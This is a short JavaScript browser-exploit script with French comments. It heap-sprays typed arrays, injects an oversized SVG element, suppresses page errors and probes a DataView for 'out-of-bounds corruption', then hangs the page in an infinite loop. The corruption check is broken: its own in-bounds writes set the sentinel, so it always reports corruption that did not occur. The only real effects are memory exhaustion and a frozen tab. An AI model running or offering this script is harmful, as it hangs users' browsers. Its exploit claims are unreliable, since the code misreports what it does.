(() => {
  // 🔧 Hook global pour erreurs JS
  window.onerror = (msg, src, line, col, err) => {
    console.log("❗ window.onerror —", msg, "at", line, col);
    document.title = "ERR";
    return true;
  };

  // 🛠️ Crash control via DOM moddé
  function triggerCrash() {
    let crashDiv = document.createElement("div");
    crashDiv.style.cssText = "position:absolute;top:0;left:0;width:100px;height:100px;background:red;z-index:9999";
    crashDiv.textContent = "[CRASH]";
    document.body.appendChild(crashDiv);

    // Freeze volontaire
    while (true) {}
  }

  // 🔫 Étape 1 : spray massif
  const heapspray = [];
  for (let i = 0; i < 20000; i++) {
    heapspray.push(new Float64Array(1000));
  }
  console.log("[1] Heap spray complet");

  // 🔫 Étape 2 : structure DOM cible vulnerability
  const vuln = document.createElement("div");
  vuln.innerHTML = `<svg><g id="${"X".repeat(50000)}"></g></svg>`;
  document.body.appendChild(vuln);
  console.log("[2] Structure DOM parasite injectée");

  // 🔫 Étape 3 : buffer modifiable
  const buf = new ArrayBuffer(0x1000);
  const dv = new DataView(buf);

  // 🕵️ Retrouver 'index manipulable'
  let corrupted = false;

  // 🔫 Étape 4 : boucle d’épreuves pour provoquer OOB / corruption
  for (let rep = 0; rep < 100; rep++) {
    try {
      // On réinitialise legerement le buffer
      for (let i = 0; i < 0x400; i++) {
        dv.setUint32(i * 2, 0x41414141, true);
      }
    } catch (e) {
      console.log("[!] Exception d'écriture:", e);
      break;
    }

    // 🧩 On lit un offset "sous-mémoire" pour essayer de capter un signe de corruption
    let sentinel = dv.getUint32(0x400, true);

    if (sentinel !== 0) {
      console.log(`[+] Sentinel modifié rep=${rep}, val=0x${sentinel.toString(16)}`);
      corrupted = true;
      break;
    }
  }

  if (corrupted) {
    console.log("✅ Corruption détectée, déclenchement du crash");
    triggerCrash();
  } else {
    console.log("🔄 Aucune corruption détectée.");
    document.title = "NO CORRUPT";
  }
})();
